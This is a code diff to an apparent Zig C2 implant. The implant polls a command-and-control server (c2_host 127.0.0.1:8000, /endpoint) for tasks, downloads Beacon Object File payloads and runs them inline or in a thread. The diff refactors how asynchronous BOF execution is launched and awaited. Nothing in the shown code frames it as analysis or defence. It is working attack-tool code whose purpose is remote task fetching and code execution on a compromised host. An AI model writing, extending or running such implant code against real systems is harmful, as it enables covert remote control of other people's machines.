@@ -6,22 +6,6 @@ const c2_host = "127.0.0.1:8000";
 const c2_endpoint = "/endpoint";
 const jitter = 3;
 
-const UserContext = struct {
-    id: i32,
-    done_event: std.Thread.ResetEvent = .{},
-};
-
-fn completionCallback(
-    bof_handle: bof.Handle,
-    run_result: c_int,
-    user_context: ?*anyopaque,
-) callconv(.C) void {
-    _ = bof_handle;
-    _ = run_result;
-    const context = @as(*UserContext, @ptrCast(@alignCast(user_context)));
-    context.done_event.set();
-}
-
 fn fetchBofContent(allocator: std.mem.Allocator, bof_uri: []const u8) ![]u8 {
     var h = std.http.Headers{ .allocator = allocator };
 
@@ -96,6 +80,9 @@ pub fn main() !u8 {
 
     const heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint);
 
+    _ = bof.initLauncher();
+    defer bof.deinitLauncher();
+
     while (true) {
         // send heartbeat to C2 and check if any tasks are pending
         var req = try http_client.request(.GET, heartbeat_uri, heartbeat_header, .{});
@@ -163,7 +150,6 @@ pub fn main() !u8 {
                 //const args_spec = iter_hdr.next() orelse return error.BadData;
 
                 var bof_handle: bof.Handle = undefined;
-                var context = UserContext{ .id = 2 };
 
                 if (std.mem.eql(u8, exec_mode, "inline")) {
                     stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
@@ -181,22 +167,19 @@ pub fn main() !u8 {
                 } else if (std.mem.eql(u8, exec_mode, "thread")) {
                     stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
 
-                    _ = bof.initLauncher();
-                    defer bof.deinitLauncher();
-
-                    context = UserContext{ .id = 1 };
-
                     _ = bof.load("sgsfgr", bof_content.ptr, @as(c_int, @intCast(bof_content.len)), &bof_handle);
                     //defer bof.unload(bof_handle);
 
+                    var event: *bof.Event = undefined;
                     _ = bof.runAsync(
                         bof_handle,
                         @constCast(bof_args.ptr),
                         @as(i32, @intCast(bof_args.len)),
-                        completionCallback,
-                        @as(*UserContext, @ptrCast(&context)),
+                        null,
+                        null,
+                        &event,
                     );
-                    context.done_event.wait();
+                    event.wait();
                 } else if (std.mem.eql(u8, exec_mode, "process")) {
                     stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
                 }
